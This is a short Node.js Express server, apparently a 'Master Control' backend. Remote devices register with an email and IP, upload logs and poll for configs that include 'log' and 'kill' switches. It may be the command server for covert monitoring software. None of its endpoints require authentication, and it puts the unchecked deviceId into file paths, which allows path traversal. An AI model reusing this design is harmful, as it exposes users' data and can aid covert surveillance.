
const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(bodyParser.json());

const DATA_DIR = path.join(__dirname, 'data');
const CONFIG_DIR = path.join(DATA_DIR, 'configs');
const LOGS_DIR = path.join(DATA_DIR, 'logs');
const INDEX_FILE = path.join(DATA_DIR, 'index.json');

// Ensure required directories and files exist
[CONFIG_DIR, LOGS_DIR].forEach(dir => {
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
});
if (!fs.existsSync(INDEX_FILE)) fs.writeFileSync(INDEX_FILE, "[]");

// Read and write helpers
function readJSON(file) {
  try { return JSON.parse(fs.readFileSync(file, 'utf8')); } catch { return []; }
}
function writeJSON(file, data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

// Register device
app.post('/api/register-device', (req, res) => {
  const { deviceId, email, ip, time } = req.body;
  const index = readJSON(INDEX_FILE);
  if (!index.find(d => d.deviceId === deviceId)) {
    index.push({ deviceId, email, ip, time });
    writeJSON(INDEX_FILE, index);
  }
  res.json({ status: 'registered' });
});

// Get all devices
app.get('/api/devices', (req, res) => {
  res.json(readJSON(INDEX_FILE));
});

// Get logs for device
app.get('/api/logs/:deviceId', (req, res) => {
  const file = path.join(LOGS_DIR, `${req.params.deviceId}.json`);
  res.json(fs.existsSync(file) ? readJSON(file) : []);
});

// Send log from device
app.post('/api/send-log', (req, res) => {
  const { deviceId, log } = req.body;
  const file = path.join(LOGS_DIR, `${deviceId}.json`);
  const logs = fs.existsSync(file) ? readJSON(file) : [];
  logs.push(log);
  writeJSON(file, logs);
  res.json({ status: 'log saved' });
});

// Get device config
app.get('/api/config/:deviceId', (req, res) => {
  const file = path.join(CONFIG_DIR, `${req.params.deviceId}.json`);
  res.json(fs.existsSync(file) ? readJSON(file) : { error: 'No config found' });
});

// Update device config
app.post('/api/update-config', (req, res) => {
  const { deviceId, config } = req.body;
  const file = path.join(CONFIG_DIR, `${deviceId}.json`);
  writeJSON(file, config);
  res.json({ status: 'config updated' });
});

// Universal fallback for config polling
app.get("/api/configs/:deviceId", (req, res) => {
  const file = path.join(CONFIG_DIR, `${req.params.deviceId}.json`);
  if (fs.existsSync(file)) {
    res.json(readJSON(file));
  } else {
    res.json({ email: "", log: true, kill: false });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Master Control Backend running on port ${PORT}`);
});
